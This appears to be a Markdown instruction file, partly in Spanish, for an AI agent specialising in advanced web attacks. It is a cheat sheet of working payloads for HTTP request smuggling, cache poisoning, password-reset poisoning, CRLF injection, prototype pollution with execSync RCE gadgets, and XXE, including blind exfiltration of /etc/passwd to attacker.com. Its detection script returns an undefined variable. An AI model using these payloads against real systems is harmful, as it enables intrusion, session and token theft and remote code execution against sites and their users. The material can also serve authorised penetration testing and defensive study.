# 🌐 Advanced Web Vulnerabilities Agent
## HTTP Smuggling, Cache Poisoning, Prototype Pollution & More

---

## OVERVIEW

Este agente se especializa en vulnerabilidades web avanzadas que requieren comprensión profunda de protocolos HTTP, arquitecturas de caching, y comportamientos de parsers JavaScript.

---

## 1. HTTP REQUEST SMUGGLING

### Conceptos Base

```yaml
description: |
  Ocurre cuando frontend y backend interpretan requests HTTP de forma diferente,
  permitiendo "smuggle" requests maliciosos dentro de requests legítimos.

attack_types:
  CL.TE:
    description: "Frontend usa Content-Length, Backend usa Transfer-Encoding"
    
  TE.CL:
    description: "Frontend usa Transfer-Encoding, Backend usa Content-Length"
    
  TE.TE:
    description: "Ambos usan TE pero procesan de forma diferente"
    
  H2.CL:
    description: "HTTP/2 frontend con downgrade a HTTP/1.1 backend"
```

### Detection Payloads

```http
# CL.TE Detection
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G

# Si responde con "Unrecognized method GPOST" = vulnerable

# TE.CL Detection
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


# H2.CL Detection (HTTP/2)
:method: POST
:path: /
:authority: target.com
content-type: application/x-www-form-urlencoded
content-length: 0

GET /admin HTTP/1.1
Host: target.com


```

### Exploitation Techniques

```python
# Request Smuggling Exploits

# 1. Bypassing Frontend Security
CL_TE_BYPASS = """POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1"""

# 2. Capturing Other Users' Requests
REQUEST_CAPTURE = """POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

data="""  # Next user's request gets appended

# 3. Reflected XSS via Smuggling
XSS_SMUGGLING = """POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: target.com
X-Ignore: x"""

# 4. Cache Poisoning via Smuggling
CACHE_POISON = """POST / HTTP/1.1
Host: target.com
Content-Length: 180
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: attacker.com
X-Ignore: x

"""
```

### HTTP/2 Smuggling

```python
# H2.CL Smuggling
H2_CL_PAYLOAD = {
    ":method": "POST",
    ":path": "/",
    ":authority": "target.com",
    "content-type": "application/x-www-form-urlencoded",
    "content-length": "0",  # This gets passed to backend
    "body": "GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
}

# H2.TE Smuggling
H2_TE_PAYLOAD = {
    ":method": "POST",
    ":path": "/",
    ":authority": "target.com",
    "transfer-encoding": "chunked",  # Not valid in H2 but may work
    "body": "0\r\n\r\nGET /admin HTTP/1.1\r\n\r\n"
}

# CRLF Injection in H2 Headers
H2_CRLF_PAYLOAD = {
    ":method": "GET",
    ":path": "/",
    "foo": "bar\r\nTransfer-Encoding: chunked",
}
```

### Tools

```bash
# Burp Extension: HTTP Request Smuggler
# Turbo Intruder for timing attacks

# smuggler.py
python smuggler.py -u https://target.com

# h2csmuggler (HTTP/2 cleartext)
python h2csmuggler.py -x https://target.com/
```

---

## 2. WEB CACHE POISONING

### Conceptos Base

```yaml
description: |
  Manipular el cache para servir contenido malicioso a otros usuarios.
  El atacante envenena la cache con una respuesta manipulada.

requirements:
  - Identificar unkeyed inputs (headers/params que afectan response pero no cache key)
  - Response debe ser cacheable
  - Payload debe persistir en response cacheada

cache_key_components:
  typical:
    - URL path
    - Query parameters (algunos)
    - Host header
  often_ignored:
    - X-Forwarded-Host
    - X-Original-URL
    - Custom headers
```

### Detection

```python
CACHE_POISON_DETECTION = {
    # Unkeyed Headers to test
    "headers": [
        "X-Forwarded-Host",
        "X-Forwarded-Scheme", 
        "X-Forwarded-Proto",
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Host",
        "X-Forwarded-Server",
        "X-HTTP-Method-Override",
        "X-Original-Host",
        "Forwarded",
    ],
    
    # Unkeyed parameters
    "params": [
        "utm_source",
        "utm_campaign",
        "callback",
        "jsonp",
        "_",
        "cachebuster",
    ],
    
    # Detection technique
    "method": """
    1. Add unique cache buster to URL: /page?cb=unique123
    2. Add test header: X-Forwarded-Host: test123.com
    3. Check if 'test123.com' appears in response
    4. If yes, remove cache buster and retry
    5. If persists for other users = Cache Poisoning
    """
}
```

### Exploitation Payloads

```http
# Basic X-Forwarded-Host Poisoning
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Response includes: <script src="https://attacker.com/main.js">
# Cache stores this for all users

# X-Original-URL for restricted endpoints
GET /anything HTTP/1.1
Host: target.com
X-Original-URL: /admin

# Vary header manipulation
GET / HTTP/1.1
Host: target.com
Accept-Language: en
X-Forwarded-Host: attacker.com

# Fat GET request (body in GET)
GET /?cb=123 HTTP/1.1
Host: target.com
Content-Length: 50

x=<script>alert(document.domain)</script>

# Parameter cloaking
GET /page?param=value%26unkeyed=<script>alert(1)</script> HTTP/1.1
Host: target.com
```

### Web Cache Deception

```yaml
description: |
  Engañar al cache para guardar respuestas privadas como públicas.

technique:
  - User visits: target.com/account/settings
  - Attacker tricks user to visit: target.com/account/settings.css
  - Backend serves /account/settings (ignores extension)
  - Cache stores as static file (cacheable)
  - Attacker requests same URL, gets user's private data

payloads:
  - /account/settings.css
  - /account/settings.js
  - /account/settings.png
  - /account/settings/nonexistent.css
  - /account/settings%00.css
  - /account/settings%3B.css
```

### Tools

```bash
# Web Cache Vulnerability Scanner (WCVS)
wcvs -u https://target.com -hw wordlist-headers.txt

# Param Miner (Burp Extension)
# Automatically discovers unkeyed params/headers

# Custom scanner
python cache_poison_scanner.py -u https://target.com --headers --params
```

---

## 3. PROTOTYPE POLLUTION

### Conceptos Base

```javascript
// JavaScript objects inherit from Object.prototype
// Polluting it affects ALL objects

// Normal object
let obj = {};
console.log(obj.polluted); // undefined

// Pollution
Object.prototype.polluted = "yes";
console.log(obj.polluted); // "yes" - ALL objects affected!

// Attack vectors
// 1. Deep merge functions
// 2. Query string parsers
// 3. JSON parsing with custom logic
```

### Detection Payloads

```python
# Client-Side Detection (via URL)
CLIENT_SIDE_PAYLOADS = [
    # Query string
    "?__proto__[polluted]=true",
    "?__proto__.polluted=true",
    "?constructor[prototype][polluted]=true",
    "?constructor.prototype.polluted=true",
    
    # Hash fragment
    "#__proto__[polluted]=true",
    
    # JSON body
    '{"__proto__":{"polluted":"true"}}',
    '{"constructor":{"prototype":{"polluted":"true"}}}',
]

# Server-Side Detection (Node.js)
SERVER_SIDE_PAYLOADS = [
    # JSON body
    {
        "__proto__": {
            "status": 510,  # Change response status
        }
    },
    {
        "__proto__": {
            "content-type": "text/html",  # Change content type
        }
    },
    {
        "constructor": {
            "prototype": {
                "shell": "/bin/bash",  # RCE in some cases
            }
        }
    },
]
```

### Exploitation - Client Side

```javascript
// Finding gadgets for XSS
// 1. innerHTML gadget
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';

// 2. src gadget
Object.prototype.src = 'javascript:alert(1)';

// 3. href gadget
Object.prototype.href = 'javascript:alert(1)';

// 4. Template gadget (Vue.js)
Object.prototype.template = '<img src=x onerror=alert(1)>';

// 5. data gadget
Object.prototype.data = '<script>alert(1)</script>';

// Common vulnerable patterns
// - document.createElement() with unset attributes
// - jQuery().html() with undefined data
// - Dynamic property access
```

### Exploitation - Server Side

```javascript
// RCE via child_process
// If app uses child_process.spawn/fork with empty options
Object.prototype.shell = true;
Object.prototype.env = { NODE_DEBUG: 'require("child_process").exec("id")' };

// RCE via EJS template
Object.prototype.outputFunctionName = 'x;process.mainModule.require("child_process").execSync("id");x';

// RCE via Pug template
Object.prototype.block = {
    "type": "Text",
    "line": "process.mainModule.require('child_process').execSync('id')"
};

// DoS via toString
Object.prototype.toString = function() { while(1){} };
```

### Detection Script

```python
import requests
import json

def test_prototype_pollution(url):
    """Test for server-side prototype pollution"""
    
    # Test payloads
    payloads = [
        # Status code pollution
        {"__proto__": {"status": 510}},
        
        # JSON spaces pollution (Express.js)
        {"__proto__": {"json spaces": 10}},
        
        # Content-type pollution
        {"__proto__": {"content-type": "application/octet-stream"}},
        
        # Exposing hidden params
        {"__proto__": {"admin": True}},
    ]
    
    for payload in payloads:
        # Send polluting request
        r1 = requests.post(
            url,
            json=payload,
            headers={"Content-Type": "application/json"}
        )
        
        # Send clean request to check persistence
        r2 = requests.get(url)
        
        # Check for pollution indicators
        if r2.status_code == 510:
            print(f"[!] Status code pollution successful")
        
        if "  " * 5 in r2.text:  # Extra JSON spaces
            print(f"[!] JSON spaces pollution successful")
    
    return results
```

### Tools

```bash
# ppmap - Client-side scanner
ppmap -u "https://target.com"

# ppfuzz
ppfuzz -l urls.txt

# Server-Side Prototype Pollution Scanner (Burp Extension)
# Available in BApp Store

# PP Finder (YesWeHack)
# https://github.com/yeswehack/pp-finder
```

---

## 4. HOST HEADER INJECTION

### Attack Vectors

```http
# Basic Host Header Attack
GET / HTTP/1.1
Host: attacker.com

# Double Host Header
GET / HTTP/1.1
Host: target.com
Host: attacker.com

# Absolute URL
GET https://attacker.com/ HTTP/1.1
Host: target.com

# Host override headers
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Original-URL: /admin
X-Rewrite-URL: /admin

# Port injection
GET / HTTP/1.1
Host: target.com:@attacker.com

# Subdomain injection
GET / HTTP/1.1
Host: attacker.target.com
```

### Password Reset Poisoning

```http
# Step 1: Request password reset with poisoned host
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com

# Step 2: Victim receives email with:
# https://attacker.com/reset?token=SECRET_TOKEN

# Step 3: Attacker captures token on their server
```

### Web Cache Poisoning via Host

```http
GET /static/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Response cached with script loading from attacker.com
# <script src="https://attacker.com/malicious.js">
```

---

## 5. CRLF INJECTION

### Basic Payloads

```python
CRLF_PAYLOADS = [
    # Header injection
    "%0d%0aSet-Cookie:%20malicious=true",
    "%0d%0aLocation:%20https://attacker.com",
    
    # XSS via header injection
    "%0d%0a%0d%0a<script>alert(1)</script>",
    
    # Response splitting
    "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a",
    
    # Encoded variants
    "%0D%0A",
    "\\r\\n",
    "%E5%98%8A%E5%98%8D",  # UTF-8 encoding
    "%u000d%u000a",
]

# Test locations
CRLF_TEST_POINTS = [
    "?redirect={payload}",
    "?url={payload}",
    "?callback={payload}",
    "?next={payload}",
    "/redirect/{payload}",
]
```

---

## 6. XXE (XML EXTERNAL ENTITY)

### Basic Payloads

```xml
<!-- Basic file read -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- SSRF -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&xxe;</data>

<!-- Out-of-Band (Blind XXE) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>

<!-- evil.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;

<!-- Error-based XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>

<!-- XInclude (when you can't control DOCTYPE) -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### XXE in File Uploads

```python
# SVG with XXE
svg_xxe = '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>'''

# DOCX (Word) - document.xml
docx_xxe = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>'''

# XLSX (Excel) - similar approach

# PDF with XXE (some parsers)
```

---

## METODOLOGÍA DE TESTING

```python
class AdvancedWebTester:
    def __init__(self, target):
        self.target = target
        
    def full_scan(self):
        results = {}
        
        # 1. HTTP Smuggling
        results['smuggling'] = self.test_http_smuggling()
        
        # 2. Cache Poisoning
        results['cache'] = self.test_cache_poisoning()
        
        # 3. Prototype Pollution
        results['prototype'] = self.test_prototype_pollution()
        
        # 4. Host Header
        results['host'] = self.test_host_header()
        
        # 5. CRLF
        results['crlf'] = self.test_crlf()
        
        # 6. XXE
        results['xxe'] = self.test_xxe()
        
        return results
```

---

## OUTPUT

```
03-vulnerabilities/advanced/
├── http-smuggling/
│   ├── detection-results.md
│   └── exploitation-poc.md
├── cache-poisoning/
│   ├── unkeyed-inputs.md
│   └── poison-poc.md
├── prototype-pollution/
│   ├── client-side.md
│   └── server-side.md
├── host-header/
│   └── injection-results.md
├── crlf/
│   └── injection-results.md
└── xxe/
    └── exploitation-results.md
```

---

**Versión**: 1.0
**Última actualización**: 2025
**Modelo recomendado**: opus (complejidad alta)
